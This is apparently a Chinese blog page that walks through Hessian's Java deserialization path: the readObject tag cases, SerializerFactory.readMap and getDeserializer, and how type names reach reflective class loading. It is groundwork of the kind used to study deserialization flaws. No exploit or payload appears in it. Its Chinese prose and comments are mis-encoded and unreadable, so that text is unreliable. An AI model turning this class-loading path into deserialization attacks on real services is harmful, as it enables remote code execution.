è¡¨ç¤ºæœ€åä¸€å—</span></span><br><span class="line">            _isLastChunk = tag == <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">            _chunkLength = (read() &lt;&lt; <span class="number">8</span>) + read();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> data;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€å­—èŠ‚è¯»å–å½“å‰åˆ†å—ï¼ŒparseByte() è¿”å› &lt;0 è¡¨ç¤ºæœ¬åˆ†å—ç»“æŸ</span></span><br><span class="line">            <span class="keyword">while</span> ((data = parseByte()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                bos.write(data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// åˆ—è¡¨/é›†åˆï¼šå¯å¸¦â€œå£°æ˜ç±»å‹â€å’Œâ€œé•¿åº¦â€</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> readLength();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// äº¤ç”±åºåˆ—åŒ–å·¥å‚æ ¹æ®å£°æ˜ç±»å‹ååºåˆ—åŒ–ä¸ºåˆé€‚çš„é›†åˆå®ç°</span></span><br><span class="line">            <span class="keyword">return</span> _serializerFactory.readList(<span class="built_in">this</span>, length, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// Map/å¯¹è±¡ï¼šå¯å¸¦â€œå£°æ˜ç±»å‹â€</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// äº¤ç”±åºåˆ—åŒ–å·¥å‚æ ¹æ®ç±»å‹ååºåˆ—åŒ–ï¼ˆå¯èƒ½æ˜ å°„ä¸º Java Bean/Map ç­‰ï¼‰</span></span><br><span class="line">            <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// å¼•ç”¨ï¼šæŒ‰ç´¢å¼•ä»å¼•ç”¨è¡¨å–å›å…ˆå‰è§£æè¿‡çš„å¯¹è±¡ï¼ˆç”¨äºå›¾ç»“æ„/é‡å¤å¯¹è±¡ï¼‰</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">ref</span> <span class="operator">=</span> parseInt();</span><br><span class="line">            <span class="keyword">return</span> _refs.get(ref);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// è¿œç¨‹å¼•ç”¨ï¼šç±»å‹ + URLï¼Œè§£æä¸ºè¿œç¨‹å¯¹è±¡/ä»£ç†</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> readString();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> resolveRemote(type, url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// æœªçŸ¥æ ‡ç­¾ï¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">            <span class="keyword">throw</span> error(<span class="string">&quot;unknown code for readObject at &quot;</span> + codeName(tag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ååºåˆ—åŒ–å™¨è·å–"><a href="#ååºåˆ—åŒ–å™¨è·å–" class="headerlink" title="ååºåˆ—åŒ–å™¨è·å–"></a>ååºåˆ—åŒ–å™¨è·å–</h4><p>ä¸Šè¿°ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé’ˆå¯¹æŸäº›ç±»å‹ä¼šè°ƒç”¨ <code>com.caucho.hessian.io.SerializerFactory#getDeserializer</code> æ¥è·å–ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<ul>
<li><p>å¯¹äºæœ‰ <code>Class cl</code> æŒ‡å®šæœŸæœ›ç±»å‹çš„æƒ…å†µï¼Œä¼šç›´æ¥æ ¹æ® <code>cl</code> è°ƒç”¨ <code>getDeserializer</code> è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">    <span class="comment">// &#x27;M&#x27; â†’ Mapï¼ˆé”®å€¼å¯¹ï¼‰</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType(); <span class="comment">// å¯èƒ½ä¸º &quot;&quot;ï¼ˆæ— æ˜¾å¼ç±»å‹ï¼‰</span></span><br><span class="line">    <span class="comment">// hessian/3386 å…¼å®¹ï¼šå½“ type ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼ŒæŒ‰æœŸæœ›ç±»å‹çš„ååºåˆ—åŒ–å™¨è¯»å–</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(type)) &#123;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">reader</span> <span class="operator">=</span> _serializerFactory.getDeserializer(cl);</span><br><span class="line">        <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æœ‰æ˜¾å¼ç±»å‹æ—¶ï¼Œä¼˜å…ˆç”¨â€œå¯¹è±¡ç±»å‹â€çš„ååºåˆ—åŒ–å™¨ï¼ˆå¯æ˜ å°„åˆ°å…·ä½“ Java ç±»å‹ï¼‰</span></span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">reader</span> <span class="operator">=</span> _serializerFactory.getObjectDeserializer(type);</span><br><span class="line">        <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¯¹äºæ²¡æœ‰æŒ‡å®šæœŸæœ›ç±»å‹çš„æƒ…å†µï¼Œåˆ™äº¤ç”±åºåˆ—åŒ–å·¥å‚æ ¹æ®ç±»å‹ååºåˆ—åŒ–ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">    <span class="comment">// Map/å¯¹è±¡ï¼šå¯å¸¦â€œå£°æ˜ç±»å‹â€</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// äº¤ç”±åºåˆ—åŒ–å·¥å‚æ ¹æ®ç±»å‹ååºåˆ—åŒ–ï¼ˆå¯èƒ½æ˜ å°„ä¸º Java Bean/Map ç­‰ï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>_serializerFactory#readMap</code> ä¼šå…ˆ <code>getDeserializer</code> è·å–ååºåˆ—åŒ–å™¨ï¼Œç„¶åå†åˆ©ç”¨è·å–çš„ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»¥ Map çš„å½¢å¼ä» Hessian è¾“å…¥æµè¯»å–å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * é€‰æ‹©ååºåˆ—åŒ–å™¨çš„é¡ºåºï¼š</span></span><br><span class="line"><span class="comment"> * 1) ä¼˜å…ˆæ ¹æ®ä¼ å…¥çš„ç±»å‹æ ‡è¯† &#123;<span class="doctag">@code</span> type&#125; è·å–ä¸“ç”¨çš„ Deserializerï¼›</span></span><br><span class="line"><span class="comment"> * 2) è‹¥æ²¡æœ‰ï¼Œå›é€€åˆ°å·²ç¼“å­˜çš„åŸºäº HashMap çš„é€šç”¨ååºåˆ—åŒ–å™¨ï¼›</span></span><br><span class="line"><span class="comment"> * 3) è‹¥ä»æ²¡æœ‰ï¼Œåˆ™æ‡’åŠ è½½åˆ›å»ºä¸€ä¸ª MapDeserializer å¹¶ç¼“å­˜ï¼Œç„¶åä½¿ç”¨å®ƒè¯»å–ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in   Hessian è¾“å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type ç›®æ ‡ç±»å‹åç§°ï¼ˆå¯èƒ½ä¸º null æˆ–æœªçŸ¥ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>     ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼ˆé€šå¸¸ä¸º Mapï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HessianProtocolException åè®®è§£æé”™è¯¯æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              IO è¯»å†™é”™è¯¯æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">        <span class="keyword">throws</span> HessianProtocolException, IOException &#123;</span><br><span class="line">    <span class="comment">// å°è¯•æ ¹æ®ç±»å‹è·å–ä¸“ç”¨ååºåˆ—åŒ–å™¨ï¼ˆè‹¥ type åŒ¹é…ï¼Œé€šå¸¸èƒ½å¾—åˆ°æ›´å‡†ç¡®çš„ç±»å‹ä¿¡æ¯ï¼‰</span></span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æƒ…å†µ 1ï¼šæ‰¾åˆ°ä¸“ç”¨ååºåˆ—åŒ–å™¨ï¼Œç›´æ¥ä½¿ç”¨å®ƒè¯»å– Map</span></span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer.readMap(in);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æƒ…å†µ 2ï¼šæ²¡æœ‰ä¸“ç”¨ååºåˆ—åŒ–å™¨ï¼Œä½†å·²å­˜åœ¨é€šç”¨çš„ HashMap ååºåˆ—åŒ–å™¨ï¼Œç›´æ¥å¤ç”¨</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_hashMapDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æƒ…å†µ 3ï¼šä¸¤è€…éƒ½æ²¡æœ‰æ—¶ï¼Œæ‡’åŠ è½½å¹¶ç¼“å­˜ä¸€ä¸ªåŸºäº HashMap çš„ååºåˆ—åŒ–å™¨åå†è¯»å–</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _hashMapDeserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(HashMap.class);</span><br><span class="line">        <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getDeserializer</code> ä¼šæ ¹æ®å­—ç¬¦ä¸²ç±»å‹çš„ <code>type</code> å°è¯•åå°„åŠ è½½ç±»ï¼Œç„¶åå†æ ¹æ® <code>Class</code> è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®å­—ç¬¦ä¸²ç±»å‹åè¿”å›å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼ˆDeserializerï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * é€‰æ‹©æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) ç©ºç±»å‹åç›´æ¥è¿”å› nullï¼›</span></span><br><span class="line"><span class="comment"> * 2) å°è¯•ä»ä¸€çº§ç¼“å­˜ _cachedTypeDeserializerMap è·å–ï¼ˆçº¿ç¨‹å®‰å…¨åœ°è¯»å–ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 3) æœªå‘½ä¸­åˆ™æŸ¥é™æ€æ˜ å°„ _staticTypeMapï¼ˆé¢„ç½®ç±»å‹æ˜ å°„ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 4) è‹¥ç±»å‹ä»¥ &quot;[&quot; å¼€å¤´ï¼ŒæŒ‰â€œæ•°ç»„ç±»å‹â€å¤„ç†ï¼šé€’å½’è§£æå…ƒç´ ç±»å‹å¹¶æ„é€  ArrayDeserializerï¼›</span></span><br><span class="line"><span class="comment"> * 5) å¦åˆ™å°è¯•é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥ç±»å‹å¹¶åŸºäº Class è·å–å¯¹åº”çš„ Deserializerï¼›</span></span><br><span class="line"><span class="comment"> * 6) è‹¥æœ€ç»ˆå¾—åˆ° Deserializerï¼Œåˆ™å†™å›ä¸€çº§ç¼“å­˜ä»¥ä¾¿åç»­å¤ç”¨ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type å­—ç¬¦ä¸²å½¢å¼çš„ç±»å‹åï¼ˆå¯èƒ½ä¸º null æˆ–ç©ºä¸²ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>     å¯¹åº”ç±»å‹çš„ Deserializerï¼Œè‹¥æ— æ³•è¯†åˆ«åˆ™ä¸º null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HessianProtocolException åè®®ç›¸å…³å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(String type)</span></span><br><span class="line">        <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">    <span class="comment">// 1) æ— æ•ˆç±»å‹åç›´æ¥è¿”å› null</span></span><br><span class="line">    <span class="keyword">if</span> (type == <span class="literal">null</span> || type.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Deserializer deserializer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) ä¼˜å…ˆä»ç¼“å­˜ä¸­æŸ¥æ‰¾ï¼ˆå¤šçº¿ç¨‹ç¯å¢ƒä¸‹åŒæ­¥è¯»å–ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (_cachedTypeDeserializerMap != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">            deserializer = (Deserializer) _cachedTypeDeserializerMap.get(type);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> deserializer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) æŸ¥é™æ€ç±»å‹æ˜ å°„ï¼ˆé€šå¸¸ä¸ºå†…å»º/å¸¸è§ç±»å‹ï¼‰</span></span><br><span class="line">    deserializer = (Deserializer) _staticTypeMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) å¤„ç†æ•°ç»„ç±»å‹ã€‚Hessian ä¸­ä»¥ &quot;[&quot; å¼€å¤´è¡¨ç¤ºæ•°ç»„ï¼ˆç±»ä¼¼ JVM æè¿°ç¬¦ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (type.startsWith(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// é€’å½’è·å–å…ƒç´ ç±»å‹çš„ååºåˆ—åŒ–å™¨</span></span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">subDeserializer</span> <span class="operator">=</span> getDeserializer(type.substring(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (subDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨å·²è§£æå‡ºçš„å…ƒç´ ç±»å‹æ¥åˆ›å»ºæ•°ç»„ååºåˆ—åŒ–å™¨</span></span><br><span class="line">            deserializer = <span class="keyword">new</span> <span class="title class_">ArrayDeserializer</span>(subDeserializer.getType());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å…ƒç´ ç±»å‹æœªçŸ¥æ—¶é€€åŒ–ä¸º Object æ•°ç»„</span></span><br><span class="line">            deserializer = <span class="keyword">new</span> <span class="title class_">ArrayDeserializer</span>(Object.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 5) éæ•°ç»„ï¼šå°è¯•æŒ‰ç±»ååŠ è½½å¹¶è·å–å…¶ Deserializer</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// é¿å…ç«‹å³åˆå§‹åŒ–ç±»ï¼šç­‰ä»·äº Class.forName(type, false, getClassLoader())</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> loadSerializedClass(type);</span><br><span class="line">            deserializer = getDeserializer(cl);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// æœªçŸ¥ç±»å‹æˆ–åŠ è½½å¤±è´¥ï¼šè®°å½•è­¦å‘Šå¹¶ç»§ç»­ï¼ˆè¿”å› nullï¼‰</span></span><br><span class="line">            log.warning(<span class="string">&quot;Hessian/Burlap: &#x27;&quot;</span> + type + <span class="string">&quot;&#x27; is an unknown class in &quot;</span></span><br><span class="line">                    + getClassLoader() + <span class="string">&quot;:\n&quot;</span> + e);</span><br><span class="line">            log.log(Level.FINER, e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) è‹¥å·²è·å–åˆ°ååºåˆ—åŒ–å™¨ï¼Œåˆ™å†™å›ç¼“å­˜ï¼ˆæ‡’åˆ›å»º + åŒæ­¥å†™ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_cachedTypeDeserializerMap == <span class="literal">null</span>) &#123;</span><br><span class="line">            _cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">            _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><code>getDeserializer</code> å†…éƒ¨æœ‰ä¸ª switch åˆ†æ”¯ï¼Œå¯¹åº”ä¸åŒçš„ç±»ä¼šè¿”å›å¯¹åº”çš„ååºåˆ—åŒ–å™¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›æŒ‡å®šç±»çš„ååºåˆ—åŒ–å™¨ï¼ˆå¸¦æœ¬åœ°ç¼“å­˜ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æŸ¥æ‰¾æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) å…ˆä»æœ¬åœ°ç¼“å­˜ _cachedDeserializerMap å‘½ä¸­ï¼›</span></span><br><span class="line"><span class="comment"> * 2) æœªå‘½ä¸­åˆ™è°ƒç”¨ loadDeserializer(cl) åŠ è½½ï¼›</span></span><br><span class="line"><span class="comment"> * 3) å°†ç»“æœå†™å›ç¼“å­˜å¹¶è¿”å›ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * çº¿ç¨‹å®‰å…¨ï¼š</span></span><br><span class="line"><span class="comment"> * - ç¼“å­˜å®¹å™¨ä½¿ç”¨ ConcurrentHashMapï¼Œæ”¯æŒå¹¶å‘è®¿é—®ï¼›</span></span><br><span class="line"><span class="comment"> * - _cachedDeserializerMap æ‡’åˆå§‹åŒ–ï¼ˆç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶åˆ›å»ºï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl éœ€è¦ååºåˆ—åŒ–æˆçš„ç›®æ ‡ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> è¯¥ç±»å‹å¯¹åº”çš„ Deserializer å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HessianProtocolException åè®®/è§£æç›¸å…³å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(Class cl)</span> <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">    Deserializer deserializer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) å…ˆæŸ¥æœ¬åœ°ç¼“å­˜ï¼ˆå¯èƒ½å°šæœªåˆå§‹åŒ–ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (_cachedDeserializerMap != <span class="literal">null</span>) &#123;</span><br><span class="line">        deserializer = (Deserializer) _cachedDeserializerMap.get(cl);</span><br><span class="line">        <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> deserializer;</span><br><span class="line">        &#125;</span><br><span class="line">    